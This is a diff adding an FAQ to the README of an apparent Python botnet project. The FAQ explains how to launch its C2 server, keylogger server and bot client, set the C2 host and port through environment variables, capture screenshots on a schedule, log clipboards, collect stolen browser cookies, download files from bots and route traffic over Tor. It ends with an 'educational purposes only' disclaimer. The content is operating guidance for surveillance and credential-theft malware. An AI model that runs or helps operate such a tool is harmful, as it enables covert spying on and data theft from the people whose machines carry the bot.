@@ -22,6 +22,7 @@
 - [Web Dashboard](#-web-dashboard)
 - [Command Reference](#-command-reference)
 - [Screenshots](#️-screenshots)
+- [FAQ](#-faq)
 - [License and Usage](#-license-and-usage)
 
 ## 🚀 Features
@@ -381,6 +382,99 @@ processes = bot.get_processes_with_real_cpu()
 system_info = bot.gather_system_info()
 vm_check = bot.check_vm_environment()
 ```
+
+## ❓ FAQ
+
+### 🚀 Getting Started
+
+**How do I start the botnet system?**
+
+Follow these steps in order:
+1. `python3 Server.py` (Main C2 server)
+2. `python3 Kserver.py` (Optional - for keylogger)
+3. `python3 Net.py` (Bot client)
+4. `web start` (Optional - Web dashboard)
+
+**How do I use environment variables for connection?**
+
+Set them before running the bot:
+```bash
+export C2_HOST=192.168.1.100
+export C2_PORT=8080
+python3 Net.py
+```
+
+### 🔧 Troubleshooting
+
+**Bot is not connecting to the server. What should I do?**
+
+Check these common issues:
+- Ensure Server.py is running first
+- Check if firewall is blocking the connection
+- Verify C2_HOST and C2_PORT environment variables
+- Make sure both bot and server are on the same network
+
+**Web Dashboard is not working. How to fix?**
+
+- Start the web dashboard with `web start` command in Server.py
+- Access it at `http://localhost:5500`
+- Make sure Flask and Flask-SocketIO are installed
+- Check if port 5500 is available
+
+### 🔑 Keylogger & Screenshots
+
+**What is the difference between keylogger and Kserver.py?**
+
+- `keylogger start/stop` commands control the bot's keylogging
+- `Kserver.py` is a separate server that receives keylog data
+- You need to run Kserver.py separately for keylogger to work
+
+**How do I take screenshots from bots?**
+
+Use these commands:
+- `screenshot <bot_id>` - Single screenshot
+- `ss start <bot_id>` - Automatic screenshots every 10 seconds
+- `ss stop <bot_id>` - Stop automatic screenshots
+- Screenshots are saved to `ScreenS/` folder
+
+### 🌐 Network & Security
+
+**How do I enable Tor network?**
+
+- Install Tor on your system
+- Use `tor enable` command in Server.py
+- Bots will automatically use Tor proxy when available
+- Check status with `tor status`
+
+**What files and folders are created by the system?**
+
+The system creates these folders:
+- `clipboard_data/` - Clipboard logs
+- `cookies/` - Stolen browser cookies
+- `downloads/` - Downloaded files from bots
+- `ScreenS/` - Screenshots from bots
+
+### 💡 Usage Tips
+
+**How do I see help for specific commands?**
+
+Add `?` after any command:
+```bash
+processes ?
+keylogger ?
+upload ?
+ss ?
+```
+
+### ⚖️ Legal & Ethics
+
+**Is this legal to use?**
+
+- ⚠️ **Educational purposes only**
+- ✅ Use only on your own systems
+- ❌ Do not use on systems you don't own
+- ❌ Malicious use is prohibited
+- Check your local laws before using
 
 ## 🚨 Security Warnings
 
